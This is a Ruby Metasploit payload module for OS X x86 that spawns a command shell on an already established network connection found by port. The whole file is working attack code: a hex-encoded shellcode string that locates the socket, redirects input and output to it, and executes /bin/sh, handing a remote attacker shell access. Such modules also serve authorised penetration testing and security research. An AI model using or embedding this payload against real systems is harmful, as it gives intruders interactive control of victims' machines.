##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'OS X Command Shell, Find Port Inline',
      'Description' => 'Spawn a shell on an established connection',
      'Author'      => 'Ramon de C Valle',
      'License'     => MSF_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::FindPort,
      'Session'     => Msf::Sessions::CommandShellUnix,
      'Payload'     =>
        {
          'Offsets' =>
            {
              'CPORT' => [25, 'n'],
            },
          'Payload' =>
            "\x31\xc0\x50\x89\xe7\x6a\x10\x54\x57\x50\x50\x58\x58\x40\x50\x50\x6a\x1f\x58\xcd\x80\x66\x81" +
            "\x7f\x02\x11\x5c\x75\xee\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xf0\x79\xf6\x68\x2f\x2f\x73\x68\x68" +
            "\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80"
        }
      ))
  end
end
